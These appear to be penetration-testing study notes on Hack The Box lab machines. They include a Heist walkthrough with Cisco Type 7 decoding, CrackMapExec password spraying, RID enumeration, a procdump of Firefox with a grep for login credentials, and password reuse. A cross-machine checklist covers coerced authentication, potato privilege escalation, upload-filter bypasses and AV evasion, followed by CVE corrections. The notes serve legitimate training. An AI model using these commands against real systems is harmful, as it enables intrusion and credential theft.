**Path:** Support portal "login as guest" → attached Cisco config → crack Type 5 / decode Type 7 → SMB/WinRM spray → `chase` → Firefox process dump → admin password reuse.

**Edge cases:**

* The credential source is an *attachment* on a guest-visible ticket: a Cisco `show run` with `enable secret 5` (md5crypt) and two `password 7` blobs. Type 7 is reversible, not hashed — the first byte is a 1-based offset into the static key `tfd;kfoA,.iyewrkldJKD`, the rest XORs against the rolled key.
* Only `hazard:stealth1agent` authenticates initially; SMB gives IPC$ only, so pivot to `rpcclient` and enumerate RIDs — `lookupsids` in a loop 1000–1050 (or `lookupsid.py`) reveals `support`, `chase`, `jason`, which no wordlist would have given you. Re-spray the same password list against the new users; CME stops at the first success — add `--continue-on-success`.
* Privesc: `C:\inetpub\wwwroot\login.php` hardcodes the admin **email** and a SHA256 that does not crack. `todo.txt` says "keep checking the issues list", and five Firefox PIDs are running → dump one (`procdump64 -ma <pid> -accepteula`) and grep the dump for the POST body, add a custom regex to mimikittenz, or read `sessionstore-backups`.
* The site password is reused for `SUPPORTDESK\administrator` → `evil-winrm`.

**Commands to remember:**

```powershell
python3 cisco_de7.py 0242114B0E143F015F5D1E161713   # XOR with tfd;kfoA,.iyewrkldJKD; john --wordlist=rockyou.txt level5_hash (md5crypt) / hashcat -m 500
crackmapexec smb IP -u users -p passwords --continue-on-success
rpcclient -U 'hazard%<pw>' IP -c 'lookupsids S-1-5-21-...-1012'   # or lookupsid.py hazard:<pw>@IP
procdump64 -ma 6252 -accepteula ; grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.dmp
```

**Notes:** [SMB](/notes/protocols-and-services/smb/) · [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · Writeup: [source](https://0xdf.gitlab.io/2019/11/30/htb-heist.html)

## Cross-machine patterns

Use this as a checklist before you start and again after every shell. Each item names the boxes where it decided the outcome.

**Where the credentials hide**

- [ ] Anonymous or guest-writable FTP is a file-system read: the FTP root *is* `C:\` (Netmon), note files name the exact file to fetch (Servmon), and an Access DB plus AES zip sits one directory down (Access).
- [ ] Config and database artifacts: PRTG `Configuration.old.bak` (Netmon), `Umbraco.sdf` over NFS (Remote), `hMailServer.ini` via traversal (Mailing), `db.php` (Sniper), `.xlsm` VBA via `olevba` (Querier), `CEH.kdbx` (Jeeves), `password.properties` (Arctic).
- [ ] Sweep after landing: `*.config`, `*.ini`, `*.sdf`, `*.mdb`, `*.pst`, `web.config`, `.bash_history`, browser profiles, `.lnk` files — before hunting a new exploit.
- [ ] Hidden data needs a flag: alternate data streams (`dir /R`, Jeeves), hidden files (`gci -force`, Bounty), WSL `rootfs` history (Secnotes), Firefox dumps and `sessionstore-backups` (Heist).

**Reuse, spraying and hash handling**

- [ ] Feed every secret back into every account and service, in both username formats (`admin` vs `admin@domain`, `SUPPORTDESK\user`): year-bumped PRTG creds (Netmon), passwords-only file sprayed with FTP-derived users (Servmon), `db.php` password = Chris's Windows password (Sniper), TeamViewer secret = local admin (Remote), site admin = domain Administrator (Heist).
- [ ] Counter-examples: hMailServer's "administrator" password is mail-only, and Love's web creds are not OS creds — validate against the real service (`swaks`, SMB/WinRM) before spraying.
- [ ] Hash formats decide the mode: KeePass pairs are LM:NT for pass-the-hash (Jeeves), `.xlsm`/coerced auth is Net-NTLMv2 `-m 5600` (Querier, Giddy), Umbraco SHA1 is `-m 100` (Remote), Cisco `enable secret 5` is md5crypt (Heist).
- [ ] When an app accepts a hash directly (Arctic's HMAC login, Heist's SHA256), stop cracking and re-read the login code.

**Coerced authentication and MSSQL**

- [ ] `xp_dirtree` against your listener needs no exploit: direct login (Querier) or stacked injection (Giddy); the UNC share name must match the Responder/smbserver share.
- [ ] `mssqlclient.py -windows-auth`; low-priv logins can `xp_dirtree` while `xp_cmdshell` stays blocked — check `fn_my_permissions` before assuming a dead end.
- [ ] Windows won't run a `.ps1` from a UNC share — `xcopy` PowerUp to `%TEMP%` and dot-source it locally (Querier).

**Privileged processes, ACLs and services**

- [ ] `whoami /priv` first: `SeImpersonatePrivilege` on 2008 R2 means LonelyPotato (Bounty), on 2019 it does **not** mean JuicyPotato (Querier) — use GodPotato/PrintSpoofer/SigmaPotato or find another path.
- [ ] A SYSTEM job or service that executes a file you can write is the whole box: `C:\Log-Management\job.bat` `BUILTIN\Users:(F)` and reset each run (Markup), `taskkill.exe` missing from `C:\ProgramData\unifi-video` (Giddy).
- [ ] Root without SYSTEM: inherited Full Control on a folder does not extend to a protected file — `icacls root.txt /grant alfred:F` (Chatterbox).
- [ ] `runas /savecred` opens a new window — only useful to launch a reverse shell (Access); the DPAPI alternative is `dpapi::masterkey` + `dpapi::cred`.

**Web exploitation details that decide success**

- [ ] Upload filters: null byte plus `web.config` handler mapping when `.aspx` won't run (Bounty); `.php.png` + MIME + PNG magic bytes + `id=` filename (Buff); `.txt` filename + `application/x-java-archive` + `%00` folder truncation (Arctic); no filter at all on a profile picture (Love).
- [ ] LFI/RFI: absolute Windows path only (Sniper), session-file poisoning in `C:\Windows\Temp`, real Samba for RFI (Sniper), read-vs-include distinction and 8.3 names in log poisoning (Mailing).
- [ ] XXE needs an echoed field and the right `Content-Type` — and the port that actually parses XML (Markup).
- [ ] SSRF can be a credential leak, not just port knocking (Love); vhosts hide in TLS SANs (`openssl s_client`) before they hide in wordlists (Love).

**Tunnelling and localhost-only services**

- [ ] `netstat -ano` after every shell: choose SSRF (app fetches URLs, Love), Chisel `R:8888:localhost:8888` (Buff), or `ssh -L 8443:127.0.0.1:8443` when the config binds `allowed hosts = 127.0.0.1` (Servmon).
- [ ] Run the exploit on-box when the target has Python but you have no route (Buff), and remember a WSL uid-0 shell is not Windows admin (Secnotes).

**Tooling and enumeration pitfalls**

- [ ] Top-1000 scans miss everything: `-p-` with high `--min-rate`, plus UDP 9256 (Chatterbox); `nmap -sV` can't name JRun — `nc` + `GET /` can (Arctic).
- [ ] Wildcard 200s (118-byte XML on Servmon) break gobuster; older wordlists find what raft-medium misses (`/askjeeves`, Jeeves); `smbmap` fails where `smbclient -N -L` succeeds (Querier).
- [ ] Unprivileged users can't query services — read `HKLM:\SYSTEM\CurrentControlSet\Services` and PSReadLine `ConsoleHost_history.txt` (Giddy).
- [ ] Extremely slow targets (Arctic, ~30 s/request) punish parallel requests; one connection with long timeouts beats ten tabs of empty responses.
- [ ] Cleanup timers wipe staging directories (`UploadedFiles`, `new-site`/8808, `Important Documents`) — stage and trigger in one script (Bounty, Secnotes, Mailing).
- [ ] Exploit scripts lie: hardcoded `/votingsystem/` (Love), a missing scheme in `host =` (Remote), random JSP names (`jar tf`, Jerry), missing SMB auth in impacket (Sniper), .NET-version-specific Watson/Sherlock (Bounty). Proxy the script through Burp before guessing.
- [ ] AV/AppLocker, not a broken exploit: `shell_exec` over `system` (Buff), Ebowla for env-keyed payloads (Giddy), payload inside an allowed path such as `C:\Windows\System32\spool\drivers\color` (Sniper), `C:\Windows\tasks` (Giddy).
- [ ] Kernel fallbacks only after the above: `Hotfix(s): N/A` → Windows-Exploit-Suggester → an exploit that takes LHOST/LPORT (Arctic); a userland service bug found with `netstat`/`tasklist` beats a patch-level scan (Buff).

---

## Corrections

Two factual errors in earlier drafts were corrected during verification. Both are reflected in the notes above.

### RDP notes — BlueKeep is CVE-2019-0708, pre-auth

**Earlier draft:** a reference in the cross-machine notes implied BlueKeep required authentication or was a post-auth issue.

**Verified:** **CVE-2019-0708** is a **pre-authentication**, **wormable** RDP remote code execution vulnerability in Remote Desktop Services. It requires **no user interaction** and can be exploited **before authentication** by sending specially crafted packets. The "requires no user interaction" and "must occur before authentication" properties are the defining characteristics of BlueKeep. The notes have been corrected to state this explicitly.

### SMB notes — SMBGhost affects Windows 10 1903 and 1909 only

**Earlier draft:** the SMB cross-machine notes implied SMBGhost (CVE-2020-0796) affected Windows Server 2019, which the Windows box notes correctly did *not* list.

**Verified:** **CVE-2020-0796** ("SMBGhost") affects **Windows 10 versions 1903 and 1909**, and **Windows Server Core** installations derived from those builds — not Windows Server 2019 in general. It is a **pre-auth** RCE in the **SMBv3.1.1 compression** feature. The notes have been corrected to state the version range accurately.

### Mailing — CVE-2024-21413 and CVE-2023-2255 attributions confirmed

**Earlier draft:** the CVE numbers were correct but the mechanism descriptions were thin.

**Verified:** **CVE-2024-21413** is an Outlook **MonikerLink** RCE and credential-leak flaw (CVSS **9.8**) disclosed **13 February 2024**. **CVE-2023-2255** is a LibreOffice **floating-frame** flaw: documents with floating frames linked to external files load the frame contents **without prompting the user**, which can lead to **arbitrary code execution** when a malformed document is opened. Both attributions were correct and the mechanism descriptions have been expanded.

> **Verification method:** every CVE was checked against NVD/MITRE, the vendor advisory, and at least one independent write-up. Techniques without a CVE were checked against multiple public walkthroughs. Where a source conflict remained, the note names both possibilities rather than asserting one. The `[Machine](page)` links point to the detail pages in this repository; the CVE numbers are the external anchors.
